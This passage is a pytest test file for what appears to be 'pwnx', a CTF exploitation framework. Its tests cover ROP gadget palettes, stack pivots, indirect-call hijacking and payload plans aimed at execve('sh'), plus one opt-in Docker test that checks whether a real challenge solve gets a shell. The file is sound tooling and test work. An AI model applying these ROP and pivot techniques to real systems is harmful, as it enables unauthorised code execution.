        syscall=SYSCALL,
        constraints=(pwnx.utf8(),),
    )

    assert palette.artifact_sha256 == challenge.exe.sha256


@pytest.mark.parametrize(
    "instruction",
    [
        "xor eax, ebx; ret",
        "xor eax, eax, ebx; ret",
        "pop rdi, rsi; ret",
        "mov eax, ecx, edx; ret",
    ],
)
def test_pinned_palette_rejects_ambiguous_or_extra_operands(
    tmp_path: Path,
    instruction: str,
) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    with pytest.raises(PlanningError, match="gadget|semantic|operand|unsupported"):
        advanced.rop_palette(
            challenge,
            pinned={instruction: XOR_EAX},
            constraints=(pwnx.utf8(),),
        )


def test_pinned_palette_normalizes_32_and_64_bit_register_aliases(
    tmp_path: Path,
) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    palette = advanced.rop_palette(
        challenge,
        pinned={
            "pop rdi; ret": POP_RDI,
            "xor eax, eax; ret": XOR_EAX,
            "mov edx, eax; ret": MOV_EDX_EAX,
            "mov eax, ecx; ret": MOV_EAX_ECX,
            "syscall": SYSCALL,
        },
        constraints=(pwnx.utf8(),),
    )

    assert palette.zero["rax"] == XOR_EAX
    assert palette.move[("rdx", "rax")] == MOV_EDX_EAX
    assert palette.move[("rax", "rcx")] == MOV_EAX_ECX


def test_plan_show_is_semantic_and_expand_contains_generated_payload(
    tmp_path: Path,
) -> None:
    plan = configured_challenge(tmp_path).plan()
    rendered = plan.show().lower()

    for phrase in (
        "controlled buffer message",
        "0x2f9e38",
        "table 0x2f08e8",
        "index 4788",
        "eax",
        "stack pivot",
        "0x242d79",
        "constrained rop palette",
    ):
        assert phrase in rendered
    assert "bytescodec(b'" not in rendered
    assert "\\x00\\x00\\x00" not in rendered

    expanded = plan.expand(plan.stages[0].name).lower()
    assert "message?" in expanded
    assert "bytescodec(b'" in expanded
    assert "delimitedintegercodec(4788)" in expanded
    assert "send b'3'" in expanded


def test_two_prepared_goals_allocate_unique_menu_operation_ids(
    tmp_path: Path,
) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    store = store_menu(challenge)
    attach_execve_goal(challenge, store, address=BUFFER, table=TABLE)
    attach_execve_goal(
        challenge,
        store,
        address=BUFFER + 0x10000,
        table=TABLE + 0x10000,
    )

    names = sequence_names(challenge.plan())

    assert len(names) == 6
    assert len(set(names)) == 6
    assert {name.rsplit("#", 1)[1] for name in names} == {
        "1", "2", "3", "4", "5", "6"
    }


def test_repeated_planning_keeps_menu_ids_and_plan_stable_with_two_goals(
    tmp_path: Path,
) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    store = store_menu(challenge)
    attach_execve_goal(challenge, store, address=BUFFER, table=TABLE)
    attach_execve_goal(
        challenge,
        store,
        address=BUFFER + 0x10000,
        table=TABLE + 0x10000,
    )
    next_id = store._next_operation_id

    first = challenge.plan()
    second = challenge.plan()

    assert first.to_dict() == second.to_dict()
    assert sequence_names(first) == sequence_names(second)
    assert store._next_operation_id == next_id


@pytest.mark.parametrize(
    "declaration",
    [
        {"pop": {"mystery": POP_RDI}},
        {"zero": {"wat": XOR_EAX}},
        {"move": {("rax", "unknown"): MOV_EAX_ECX}},
    ],
)
def test_explicit_palette_rejects_unknown_registers(
    tmp_path: Path,
    declaration: dict,
) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    with pytest.raises(PlanningError, match="unknown|register"):
        advanced.rop_palette(challenge, **declaration)


def test_pinned_palette_rejects_unknown_register(tmp_path: Path) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    with pytest.raises(PlanningError, match="unknown|register|gadget"):
        advanced.rop_palette(
            challenge, pinned={"pop mystery; ret": POP_RDI}
        )


def test_indirect_call_state_rejects_unknown_register(tmp_path: Path) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    store = store_menu(challenge)
    message = advanced.controlled_buffer(
        challenge, "message", at=BUFFER, size=0x1000, writer=store.message
    )
    with pytest.raises(PlanningError, match="unknown|register"):
        challenge.indirect_call(
            table=TABLE,
            index=store.color,
            target=message.qword(PIVOT_OFFSET),
            trigger=store.show,
            state={"mystery": message.address},
        )


def test_pivot_rejects_unknown_pointer_register(tmp_path: Path) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    store = store_menu(challenge)
    message = advanced.controlled_buffer(
        challenge, "message", at=BUFFER, size=0x1000, writer=store.message
    )
    dispatch = challenge.indirect_call(
        table=TABLE,
        index=store.color,
        target=message.qword(PIVOT_OFFSET),
        trigger=store.show,
        state={"rax": message.address},
    )
    with pytest.raises(PlanningError, match="unknown|register"):
        advanced.pivot(
            dispatch,
            stack=message,
            pointer_register="mystery",
            gadget=PIVOT,
        )


def test_register_aliases_are_canonical_across_palette_state_and_pivot(
    tmp_path: Path,
) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    store = store_menu(challenge)
    message = advanced.controlled_buffer(
        challenge, "message", at=BUFFER, size=0x1000, writer=store.message
    )
    palette = advanced.rop_palette(
        challenge,
        pop={"r8d": POP_RDI},
        zero={"eax": XOR_EAX},
        move={("edx", "eax"): MOV_EDX_EAX},
    )
    dispatch = challenge.indirect_call(
        table=TABLE,
        index=store.color,
        target=message.qword(PIVOT_OFFSET),
        trigger=store.show,
        state={"eax": message.address},
    )
    pivot = advanced.pivot(
        dispatch, stack=message, pointer_register="eax", gadget=PIVOT
    )

    assert palette.pop["r8"] == POP_RDI
    assert palette.zero["rax"] == XOR_EAX
    assert palette.move[("rdx", "rax")] == MOV_EDX_EAX
    assert dispatch.state["rax"] == message.address
    assert pivot.pointer_register == "rax"


@pytest.mark.skipif(
    os.environ.get("PWNX_RUN_CTF_E2E") != "1"
    or not (DICE_CHALLENGE / "challenge").is_file(),
    reason=(
        "set PWNX_RUN_CTF_E2E=1 and PWNX_DICE_CHALLENGE=/path/to/challenge-dir"
    ),
)
def test_real_dice_message_store_solve_gets_shell() -> None:
    repository = Path(__file__).parents[1]
    command = [
        "docker",
        "run",
        "--rm",
        "-i",
        "-e",
        "PYTHONPATH=/pwnx/src",
        "-v",
        f"{repository}:/pwnx:ro",
        "-v",
        f"{DICE_CHALLENGE}:/chall",
        "-w",
        "/chall",
        "pwnx-test-linux:24.04",
        "python3",
        "solve_pwnx.py",
    ]
    result = subprocess.run(
        command,
        input=b"echo __PWNX_SHELL__; exit\n",
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        timeout=15,
        check=False,
    )

    assert result.returncode == 0, result.stdout.decode(errors="replace")
    assert b"__PWNX_SHELL__" in result.stdout


@pytest.mark.skipif(
    not (DICE_CHALLENGE / "solve_pwnx.py").is_file(),
    reason=(
        "set PWNX_DICE_CHALLENGE=/path/to/challenge-dir to inspect the external solve"
    ),
)
def test_actual_solve_uses_only_the_canonical_05_surface() -> None:
    source = (DICE_CHALLENGE / "solve_pwnx.py").read_text()
    tree = ast.parse(source)
    attributes = {
        node.attr for node in ast.walk(tree) if isinstance(node, ast.Attribute)
    }

    assert "qword" in attributes
    assert "__getitem__" not in attributes
    assert ".pivot(register=" in source
    assert ".pivot(eax=" not in source
    assert "pointer_register=" not in source
    assert "x.rop(" in source
    assert ".pop(" in source
    assert ".zero(" in source
    assert ".move(" in source
    assert ".syscall(" in source
    assert "pop_rdi=" not in source
    assert ".palette(" not in source


def test_primary_rop_namespace_exposes_only_the_fluent_path(tmp_path: Path) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))

    assert not hasattr(challenge.rop, "palette")
    assert not hasattr(challenge.rop, "pinned")
    builder = challenge.rop(pwnx.utf8())
    for method in ("pop", "zero", "move", "syscall"):
        assert callable(getattr(builder, method))


@pytest.mark.parametrize(
    "kwargs",
    [
        {"pop_rdi": POP_RDI},
        {"encoding": "utf8"},
        {"constraints": (pwnx.utf8(),)},
    ],
)
def test_removed_primary_rop_aliases_fail_with_migration_diagnostic(
    tmp_path: Path,
    kwargs: dict,
) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    with pytest.raises(
        (TypeError, PlanningError),
        match="removed|migration|advanced|x\\.rop\\(utf8|fluent",
    ):
        challenge.rop(**kwargs)


def test_buffer_index_alias_is_removed_in_favor_of_qword(tmp_path: Path) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    message = challenge.buffer(at=BUFFER, size=0x1000, encoding="utf8").written_by(
        challenge.menu(b"> ", message=(1, b"Message?", bytes)).message
    )

    with pytest.raises(
        (TypeError, PlanningError), match="qword|removed|migration|subscriptable"
    ):
        _ = message[80]
    assert message.qword(80).offset == 80


@pytest.mark.parametrize(
    "kwargs",
    [
        {"eax": "buffer"},
        {"pointer_register": "eax", "stack": "buffer"},
    ],
)
def test_pivot_aliases_are_removed_in_favor_of_register_and_stack(
    tmp_path: Path,
    kwargs: dict,
) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    store = challenge.menu(
        b"> ", name="store", message=(1, b"Message?", bytes),
        color=(2, b"> ", int), show=3,
    )
    message = challenge.buffer(at=BUFFER, size=0x1000, encoding="utf8").written_by(
        store.message
    )
    call = store.color.indexes(
        table=TABLE,
        target=message.qword(80),
        trigger=store.show,
        eax=message,
    )
    supplied = {
        key: message if value == "buffer" else value
        for key, value in kwargs.items()
    }

    with pytest.raises(
        (TypeError, PlanningError),
        match="register|stack|removed|migration|unexpected keyword",
    ):
        call.pivot(gadget=PIVOT, **supplied)


def test_primary_buffer_signature_has_one_canonical_writer_and_constraint_path() -> None:
    parameters = inspect.signature(Challenge.buffer).parameters

    assert "encoding" in parameters
    for removed in ("writer", "write", "constraint", "constraints"):
        assert removed not in parameters


def test_primary_all_excludes_advanced_implementation_types() -> None:
    excluded = {
        "Action",
        "EffectContract",
        "Payload",
        "RopPalette",
        "RopBuilder",
        "BufferSlice",
        "ControlledBuffer",
    }
    assert not excluded & set(pwnx.__all__)


def test_advanced_explicit_surface_matches_canonical_ir_payload_and_replay(
    tmp_path: Path,
) -> None:
    advanced = importlib.import_module("pwnx.advanced")
    canonical_path = tmp_path / "canonical"
    advanced_path = tmp_path / "advanced"
    canonical_path.mkdir()
    advanced_path.mkdir()
    canonical = sugar_challenge(canonical_path)

    explicit = Challenge(make_elf(advanced_path / "challenge", pie=False))
    store = store_menu(explicit)
    message = advanced.controlled_buffer(
        explicit,
        "message",
        at=BUFFER,
        size=0x1000,
        writer=store.message,
        constraints=(pwnx.utf8(),),
    )
    dispatch = explicit.control(
        explicit.indirect_call(
            table=TABLE,
            index=store.color,
            target=message.qword(80),
            trigger=store.show,
            state={"eax": message.address},
        )
    )
    pivot = explicit.control(
        dispatch.pivot(register="eax", stack=message, gadget=PIVOT)
    )
    palette = advanced.rop_palette(
        explicit,
        pop={"rdi": POP_RDI, "rsi": POP_RSI, "rcx": POP_RCX},
        zero={"rax": XOR_EAX},
        move={("rdx", "rax"): MOV_EDX_EAX, ("rax", "rcx"): MOV_EAX_ECX},
        syscall=SYSCALL,
        constraints=(pwnx.utf8(),),
    )
    explicit.want(
        explicit.execve("sh"), via=pivot, using=palette, terminal=False
    )

    canonical_plan = canonical.plan()
    explicit_plan = explicit.plan()
    assert canonical_plan.to_dict() == explicit_plan.to_dict()
    assert extract_payload(canonical_plan) == extract_payload(explicit_plan)
    assert lowered_action_tree(canonical_plan) == lowered_action_tree(explicit_plan)

    trace = Trace()
    live = ScriptedTube(b"> Message?> > > ")
    with explicit_plan.run(transport=live, trace=trace):
        pass
    with explicit_plan.run(transport=FailingTube(), replay=trace):
        pass


def test_readme_documents_only_the_canonical_primary_syntax() -> None:
    readme = (Path(__file__).parents[1] / "README.md").read_text()

    assert "message.qword(80)" in readme
    assert '.pivot(register="eax", stack=message' in readme
    assert "x.rop(utf8())" in readme
    assert "pop_rdi=" not in readme
    assert "message[80]" not in readme
    assert ".pivot(eax=" not in readme
    assert ".rop.palette(" not in readme


def test_removed_aliases_are_documented_only_in_migration_guide() -> None:
    root = Path(__file__).parents[1]
    migration = (root / "docs" / "MIGRATION_0_2_TO_0_3.md").read_text()
    ordinary = "\n".join(
        (root / path).read_text()
        for path in (
            "README.md",
            "SPEC.md",
            "docs/V03_ARCHITECTURE.md",
            "docs/PARITY.md",
        )
    )

    for alias in ("pop_rdi=", "message[80]", ".pivot(eax=", ".rop.palette("):
        assert alias in migration
        assert alias not in ordinary
